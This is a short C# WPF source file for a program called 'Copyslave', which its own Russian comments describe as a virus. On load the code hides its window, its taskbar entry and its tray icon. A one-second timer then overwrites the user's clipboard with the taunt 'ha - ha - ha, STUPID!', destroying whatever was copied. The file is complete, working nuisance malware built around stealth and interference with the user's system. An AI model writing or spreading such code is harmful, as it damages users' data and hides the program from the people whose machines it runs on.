using System.Windows;
using System.Windows.Threading;
using System.Windows.Forms;
using System;

namespace Copyslave
{
    /// <summary>
    /// Логика взаимодействия для MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        DispatcherTimer Timer = new DispatcherTimer();

        public MainWindow()
        {
            InitializeComponent();
        }

        private void Windows1_Loaded(object sender, RoutedEventArgs e)
        {
            Timer.Tick += new EventHandler(Timer_Tick);
            Timer.Interval = new TimeSpan(0, 0, 1); //1 секунда
            Timer.Start();

            //Чтобы вирус не был виден в трее
            NotifyIcon Icon = new NotifyIcon();
            Icon.Visible = false;
            
            //Скрываем вирус от панели задач
            this.ShowInTaskbar = false;

            progressBar1.Value = (100);
            Windows1.Visibility = Visibility.Collapsed; //Скрываем форму
        }

        public void Timer_Tick(object sender, EventArgs e)
        {
            if(progressBar1.Value == 100)
            {
                System.Windows.Clipboard.SetText("ha - ha - ha, STUPID!");
            }
        }
    }
}
